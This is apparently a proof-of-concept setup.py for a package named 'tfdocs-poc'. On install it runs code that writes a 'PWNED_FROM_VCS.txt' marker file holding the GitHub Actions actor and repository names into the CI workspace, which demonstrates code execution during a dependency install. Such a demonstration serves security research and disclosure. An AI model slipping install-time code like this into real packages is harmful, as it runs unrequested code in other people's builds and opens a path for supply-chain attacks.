from setuptools import setup
import os, pathlib, sys

ws = pathlib.Path(os.environ.get("GITHUB_WORKSPACE","."))
p = ws / "PWNED_FROM_VCS.txt"
actor = os.getenv("GITHUB_ACTOR","")
repo = os.getenv("GITHUB_REPOSITORY","")
p.write_text(f"actor={actor}\nrepo={repo}\n")
print(f"[POC] wrote {p}", file=sys.stderr)
setup(name="tfdocs-poc", version="0.0.1")
